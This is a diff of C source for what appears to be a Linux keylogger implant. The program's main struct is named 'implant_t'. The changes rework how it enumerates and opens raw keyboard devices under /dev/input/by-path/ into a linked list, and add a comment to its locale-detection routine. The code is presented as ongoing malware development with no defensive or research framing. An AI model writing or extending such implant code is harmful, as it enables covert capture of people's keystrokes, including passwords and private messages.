@@ -13,6 +13,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <fcntl.h>
+#include <sys/queue.h>
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <dirent.h>
@@ -50,7 +51,7 @@ void fetch_available_keyboards(implant_t *instance) {
         &alphasort
     );
 
-    if (possible_paths == -1 || chdir("/dev/input/by-path/") < 0) {
+    if (-1 == possible_paths || 0 > chdir("/dev/input/by-path/")) {
         DEBUG_LOG(
             instance->debug_enabled,
             "could not find possible keyboard paths"
@@ -59,17 +60,9 @@ void fetch_available_keyboards(implant_t *instance) {
         return;
     }
 
-    instance->kb_fd = malloc(sizeof(int) * ((size_t)possible_paths + 1));
-    if (!instance->kb_fd) {
-        DEBUG_LOG(
-            instance->debug_enabled,
-            "could not allocate memory for possible kb paths: %s",
-            strerror(errno)
-        );
-        return;
-    }
+    /* prepare TAILQ  */
+    TAILQ_INIT(&instance->kbd);
 
-    instance->kb_fd[possible_paths] = -1;
     char rpath[2048] = {0};
     for (int ctr = -1; ++ctr < possible_paths;) {
         if (!realpath(char_devices[ctr]->d_name, rpath)) {
@@ -78,10 +71,38 @@ void fetch_available_keyboards(implant_t *instance) {
                 "[!] Could not run realpath(%s): %s",
                 char_devices[ctr]->d_name, strerror(errno)
             );
-        } else instance->kb_fd[ctr] = open(rpath, O_RDONLY | O_NOCTTY | O_NDELAY);
+
+            continue;
+        }
+
+
+        keyboard_t *kbd = malloc(sizeof(keyboard_t));
+        if (!kbd) {
+            DEBUG_LOG(
+                instance->debug_enabled,
+                "[!] allocate memory for keyboard_t"
+            );
+
+            continue;
+        }
+
+
+        kbd->fd = open(rpath, O_RDONLY | O_NOCTTY | O_NDELAY);
+        if (kbd->fd < 0) {
+            DEBUG_LOG(
+                instance->debug_enabled,
+                "[!] Could not open %s: %s",
+                rpath, strerror(errno)
+            );
+
+            continue;
+        }
+
+        strncpy(kbd->name, rpath, 63);
+        TAILQ_INSERT_HEAD(&instance->kbd, kbd, devices);
     }
 
-      for (int ctr = -1; ++ctr < possible_paths;)
+    for (int ctr = -1; ++ctr < possible_paths;)
         free(char_devices[ctr]);
     free(char_devices);
 }
@@ -129,6 +150,9 @@ int get_locale(implant_t *instance) {
     /*
         function call is wrapped in order to support multiple distros
         down the line.
+
+        AFAIK, most linux distros do it like this, but this might not work for *BSD
+        for instance.
     */
 
     return parse_locale("/etc/default/locale", instance);
